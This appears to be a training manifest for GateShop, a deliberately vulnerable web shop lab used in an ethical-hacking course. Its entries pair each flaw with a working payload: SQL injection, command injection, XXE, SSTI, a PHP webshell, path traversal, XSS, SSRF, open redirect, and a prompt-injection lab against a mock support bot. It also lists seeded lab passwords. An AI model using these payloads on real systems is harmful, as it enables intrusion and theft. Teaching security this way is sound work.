# GateShop — Lab Manifest

Generated from the lab registry. Paste this back into the CEH course chat to wire each
Session-8 "Practical application" slot: lab URL + goal + open `<file>` → `<function>` (the bug) + the fix.

**Base URL:** `http://<your-vm>:8080`  ·  **Instructor console:** `/instructor`  ·  **Show code:** `/code?lab=<slug>`

## Injection

### P29 · SQLi — the query model → SQL injection — product search (UNION)
- lab_slug:      `sqli-search`
- url:           `/search?q=gift`
- goal:          Dump the users table and read the admin password hash.
- vuln_file:     `app/src/handlers/search.php`
- vuln_function: `search_products()`
- vuln_lines:    29-33
- cwe/owasp:     CWE-89 · A03
- exploit:       `q = ' UNION SELECT id, username, password, 4 FROM users-- -`
- fix:           Parameterised query (PDO prepare/execute).
- toggle:        per-lab security level `insecure` | `secure` (instructor console)
- status:        live

### P29 · SQLi — the query model → SQL injection — login bypass
- lab_slug:      `sqli-login`
- url:           `/login`
- goal:          Log in as admin without knowing the password.
- vuln_file:     `app/src/handlers/auth.php`
- vuln_function: `do_login()`
- vuln_lines:    58-62
- cwe/owasp:     CWE-89 · A03
- exploit:       `username = admin'-- -   password = anything`
- fix:           Parameterised query; never build SQL from input.
- toggle:        per-lab security level `insecure` | `secure` (instructor console)
- status:        live

### P34 · OS command injection → OS command injection — network tools
- lab_slug:      `cmdi-ping`
- url:           `/admin/tools`
- goal:          Run `id` / read /etc/passwd via the ping box.
- vuln_file:     `app/src/handlers/admin.php`
- vuln_function: `net_ping()`
- vuln_lines:    36-39
- cwe/owasp:     CWE-78 · A03
- exploit:       `host = 127.0.0.1; id`
- fix:           escapeshellarg() + allow-list; avoid the shell entirely.
- toggle:        per-lab security level `insecure` | `secure` (instructor console)
- status:        live

### P35 · XXE → XXE — product XML import
- lab_slug:      `xxe-import`
- url:           `/admin/import`
- goal:          Read /etc/passwd via an external entity.
- vuln_file:     `app/src/handlers/admin.php`
- vuln_function: `import_xml()`
- vuln_lines:    63-70
- cwe/owasp:     CWE-611 · A05
- exploit:       `<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]> ... &e;`
- fix:           libxml_disable_entity_loader / LIBXML_NONET; disable DOCTYPE.
- toggle:        per-lab security level `insecure` | `secure` (instructor console)
- status:        live

### P36 · SSTI → SSTI — custom message template
- lab_slug:      `ssti-template`
- url:           `/account/signature`
- goal:          Evaluate {{ 7*7 }} then run PHP via the template.
- vuln_file:     `app/src/handlers/account.php`
- vuln_function: `render_signature()`
- vuln_lines:    94-99
- cwe/owasp:     CWE-1336 · A03
- exploit:       `signature = {{ system('id') }}`
- fix:           Render data, never eval templates built from user input.
- toggle:        per-lab security level `insecure` | `secure` (instructor console)
- status:        live

### P37 · Insecure deserialization → Insecure deserialization — remember-me cookie
- lab_slug:      `deserial-remember`
- url:           `/login`
- goal:          Forge the serialized cookie to trigger a gadget / become another user.
- vuln_file:     `app/src/handlers/auth.php`
- vuln_function: `load_remember_cookie()`
- vuln_lines:    118-121
- cwe/owasp:     CWE-502 · A08
- exploit:       `Tamper the base64 PHP-serialized "remember" cookie.`
- fix:           Signed tokens (HMAC) or server-side sessions; never unserialize() input.
- toggle:        per-lab security level `insecure` | `secure` (instructor console)
- status:        live

## Authorization

### P24 · Access control & IDOR → IDOR — view any order
- lab_slug:      `idor-order`
- url:           `/order?id=1`
- goal:          Read another customer's order by changing the id.
- vuln_file:     `app/src/handlers/orders.php`
- vuln_function: `view_order()`
- vuln_lines:    20-47
- cwe/owasp:     CWE-639 · A01
- exploit:       `/order?id=1, 2, 3 ...`
- fix:           Check the order belongs to the logged-in user.
- toggle:        per-lab security level `insecure` | `secure` (instructor console)
- status:        live

### P25 · API & mass assignment → Mass assignment — become admin
- lab_slug:      `massassign-profile`
- url:           `/account`
- goal:          Add role=admin to the profile update and gain admin.
- vuln_file:     `app/src/handlers/account.php`
- vuln_function: `update_profile()`
- vuln_lines:    70-79
- cwe/owasp:     CWE-915 · A08
- exploit:       `POST /account with an extra field: role=admin`
- fix:           Allow-list updatable fields; never bind the whole request.
- toggle:        per-lab security level `insecure` | `secure` (instructor console)
- status:        live

### P27 · Business logic → Business logic — coupon reuse / price tamper
- lab_slug:      `bizlogic-coupon`
- url:           `/cart`
- goal:          Stack the same coupon repeatedly / set a negative quantity.
- vuln_file:     `app/src/handlers/cart.php`
- vuln_function: `apply_coupon()`
- vuln_lines:    46-55
- cwe/owasp:     CWE-840 · A04
- exploit:       `Apply SAVE10 many times, or qty = -5.`
- fix:           Enforce one-use coupons and non-negative quantities server-side.
- toggle:        per-lab security level `insecure` | `secure` (instructor console)
- status:        live

## Identity

### P21 · Authentication → Authentication — username enumeration
- lab_slug:      `auth-enum`
- url:           `/login`
- goal:          Tell valid from invalid usernames by the different error.
- vuln_file:     `app/src/handlers/auth.php`
- vuln_function: `do_login()`
- vuln_lines:    78-80
- cwe/owasp:     CWE-204 · A07
- exploit:       `Compare "no such user" vs "wrong password".`
- fix:           One generic error for both cases; constant-time-ish behaviour.
- toggle:        per-lab security level `insecure` | `secure` (instructor console)
- status:        live

## Capability

### P38 · Path traversal → Path traversal — invoice download
- lab_slug:      `pathtrav-invoice`
- url:           `/download?file=invoice-1.txt`
- goal:          Read /etc/passwd via ../ traversal.
- vuln_file:     `app/src/handlers/orders.php`
- vuln_function: `download_file()`
- vuln_lines:    45-47
- cwe/owasp:     CWE-22 · A01
- exploit:       `/download?file=../../../../etc/passwd`
- fix:           basename() + realpath() confined to the invoices dir.
- toggle:        per-lab security level `insecure` | `secure` (instructor console)
- status:        live

### P39 · File upload → File upload — avatar webshell
- lab_slug:      `upload-avatar`
- url:           `/account`
- goal:          Upload a .php file and execute it from /uploads.
- vuln_file:     `app/src/handlers/account.php`
- vuln_function: `upload_avatar()`
- vuln_lines:    122-126
- cwe/owasp:     CWE-434 · A04
- exploit:       `Upload shell.php containing <?php echo shell_exec($_GET["c"]);`
- fix:           Allow-list extensions/MIME, store outside web root, randomise name.
- toggle:        per-lab security level `insecure` | `secure` (instructor console)
- status:        live

### P40 · SSRF → SSRF — import image from URL
- lab_slug:      `ssrf-fetch`
- url:           `/account/avatar-url`
- goal:          Reach the internal-only endpoint and read its secret.
- vuln_file:     `app/src/handlers/account.php`
- vuln_function: `fetch_avatar_url()`
- vuln_lines:    148-151
- cwe/owasp:     CWE-918 · A10
- exploit:       `url = http://127.0.0.1/internal/flag`
- fix:           Allow-list hosts/schemes; block private ranges & redirects.
- toggle:        per-lab security level `insecure` | `secure` (instructor console)
- status:        live

### P42 · Information disclosure → Information disclosure — debug & backups
- lab_slug:      `infodisc-debug`
- url:           `/debug`
- goal:          Find the DB creds / secret leaked by debug output and backup files.
- vuln_file:     `app/src/handlers/misc.php`
- vuln_function: `debug_page()`
- vuln_lines:    14-24
- cwe/owasp:     CWE-200 · A05
- exploit:       `Visit /debug and /config.php.bak`
- fix:           No debug in prod; remove backups; generic error pages.
- toggle:        per-lab security level `insecure` | `secure` (instructor console)
- status:        live

## Client-side

### P46 · XSS → XSS — reflected (search)
- lab_slug:      `xss-reflected`
- url:           `/search?q=hello`
- goal:          Pop alert(document.domain) via the search term.
- vuln_file:     `app/src/handlers/search.php`
- vuln_function: `search_products()`
- vuln_lines:    49-51
- cwe/owasp:     CWE-79 · A03
- exploit:       `q = <script>alert(document.domain)</script>`
- fix:           HTML-encode on output (e()).
- toggle:        per-lab security level `insecure` | `secure` (instructor console)
- status:        live

### P46 · XSS → XSS — stored (product reviews)
- lab_slug:      `xss-stored`
- url:           `/product?id=1`
- goal:          Store a review that runs JS for every visitor.
- vuln_file:     `app/src/handlers/product.php`
- vuln_function: `post_review()`
- vuln_lines:    21-23
- cwe/owasp:     CWE-79 · A03
- exploit:       `review = <img src=x onerror=alert(document.domain)>`
- fix:           Encode on output; a strong CSP as defence in depth.
- toggle:        per-lab security level `insecure` | `secure` (instructor console)
- status:        live

### P47 · DOM-based vulns → XSS — DOM-based (location.hash)
- lab_slug:      `xss-dom`
- url:           `/welcome#name=hi`
- goal:          Run JS from the URL fragment (never sent to the server).
- vuln_file:     `app/public/assets/app.js`
- vuln_function: `renderWelcome()`
- vuln_lines:    16-18
- cwe/owasp:     CWE-79 · A03
- exploit:       `/welcome#name=<img src=x onerror=alert(1)>`
- fix:           Use textContent, not innerHTML, for untrusted data.
- toggle:        per-lab security level `insecure` | `secure` (instructor console)
- status:        live

### P48 · CSRF → CSRF — change email with no token
- lab_slug:      `csrf-email`
- url:           `/account`
- goal:          Change the victim's email from an attacker page.
- vuln_file:     `app/src/handlers/account.php`
- vuln_function: `update_profile()`
- vuln_lines:    55-79
- cwe/owasp:     CWE-352 · A01
- exploit:       `Auto-submitting cross-site form POSTing /account.`
- fix:           Per-session CSRF token + SameSite cookies.
- toggle:        per-lab security level `insecure` | `secure` (instructor console)
- status:        live

### P49 · CORS & SOP → CORS — origin reflection with credentials
- lab_slug:      `cors-api`
- url:           `/api/me`
- goal:          Read the victim's /api/me from evil.com.
- vuln_file:     `app/src/handlers/api.php`
- vuln_function: `api_me()`
- vuln_lines:    15-21
- cwe/owasp:     CWE-942 · A05
- exploit:       `fetch("/api/me",{credentials:"include"}) with a reflected Origin.`
- fix:           Allow-list origins; never reflect Origin with credentials:true.
- toggle:        per-lab security level `insecure` | `secure` (instructor console)
- status:        live

### P50 · Clickjacking → Clickjacking — unframed sensitive action
- lab_slug:      `clickjacking`
- url:           `/account/delete`
- goal:          Frame the delete page under a decoy and steal the click.
- vuln_file:     `app/src/handlers/account.php`
- vuln_function: `delete_page()`
- vuln_lines:    168-169
- cwe/owasp:     CWE-1021 · A05
- exploit:       `Embed /account/delete in a near-transparent iframe.`
- fix:           CSP frame-ancestors 'none' + X-Frame-Options: DENY.
- toggle:        per-lab security level `insecure` | `secure` (instructor console)
- status:        live

## Advanced

### P55 · Host header attacks → Host header — poisoned password-reset link
- lab_slug:      `hosthdr-reset`
- url:           `/forgot`
- goal:          Make the reset link point at an attacker host.
- vuln_file:     `app/src/handlers/auth.php`
- vuln_function: `forgot_password()`
- vuln_lines:    157-159
- cwe/owasp:     CWE-644 · A05
- exploit:       `Send Host: evil.com on the reset request.`
- fix:           Build URLs from a fixed configured base, not the Host header.
- toggle:        per-lab security level `insecure` | `secure` (instructor console)
- status:        live

### P42 · Information disclosure → Open redirect — next parameter
- lab_slug:      `openredirect-next`
- url:           `/login?next=/account`
- goal:          Redirect to an external site after login.
- vuln_file:     `app/src/handlers/auth.php`
- vuln_function: `safe_next()`
- vuln_lines:    24-26
- cwe/owasp:     CWE-601 · A01
- exploit:       `/login?next=https://evil.com`
- fix:           Only allow local paths starting with a single "/".
- toggle:        per-lab security level `insecure` | `secure` (instructor console)
- status:        live

### P53 · Web LLM attacks → Web LLM — prompt injection (GateBot)
- lab_slug:      `webllm-gatebot`
- url:           `/support`
- goal:          Make the mock assistant reveal its secret / run a privileged "tool".
- vuln_file:     `app/src/handlers/support.php`
- vuln_function: `gatebot_reply()`
- vuln_lines:    25-40
- cwe/owasp:     CWE-1427 · A03
- exploit:       `Ask it to ignore instructions; or plant the instruction in a review (indirect).`
- fix:           Treat model output as untrusted; authorise tools at the API, not in the prompt.
- toggle:        per-lab security level `insecure` | `secure` (instructor console)
- status:        live

## Recon

### P20 · Content discovery → Content discovery — hidden pages & files
- lab_slug:      `recon-discovery`
- url:           `/robots.txt`
- goal:          Enumerate the site and find the admin portal, staging, phpinfo and the backup leftover.
- vuln_file:     `app/src/handlers/recon.php`
- vuln_function: `admin_portal() / dev_page()`
- vuln_lines:    ?
- cwe/owasp:     CWE-200 · A05
- exploit:       `Read /robots.txt and /sitemap.xml; dirb/gobuster for /dev /old /phpinfo /backup.zip /admin-portal`
- fix:           Remove dev/backup files; do not expose phpinfo; keep admin paths off robots and behind auth.
- toggle:        per-lab security level `insecure` | `secure` (instructor console)
- status:        live

### P21 · Authentication → User enumeration — public profiles
- lab_slug:      `enum-user-profile`
- url:           `/users`
- goal:          Harvest every valid username by walking /user?id=1..N.
- vuln_file:     `app/src/handlers/recon.php`
- vuln_function: `user_profile()`
- vuln_lines:    66-69
- cwe/owasp:     CWE-204 · A07
- exploit:       `/user?id=1, 2, 3 … (or the /users directory)`
- fix:           Require auth for profiles; use opaque identifiers; generic 404s.
- toggle:        per-lab security level `insecure` | `secure` (instructor console)
- status:        live

## Quickstart (on the VM)

```bash
cp .env.example .env     # then edit the secrets
docker compose up -d --build
# open http://<vm-ip>:8080   ·   instructor console: /instructor
# reset between classes:
bash scripts/reset.sh     # or click "Reset" in /instructor
```

## Seeded accounts

| user | password | role |
|---|---|---|
| admin | admin123 | admin |
| instructor | teach123 | admin |
| carlos | carlos123 | user (victim) |
| wiener | peter | user |

Flags: SSRF → `GATEFLAG{...}` at `/internal/flag`; GateBot secret → `GATEBOT{...}`.

## Coverage

25 labs, all **live**. Not yet built (need extra services — ask for phase 2): NoSQL injection (MongoDB), LDAP injection (OpenLDAP), WebSocket CSWSH, web cache poisoning & HTTP request smuggling (caching/proxy tier), JWT & OAuth, prototype pollution (server-side), race conditions.
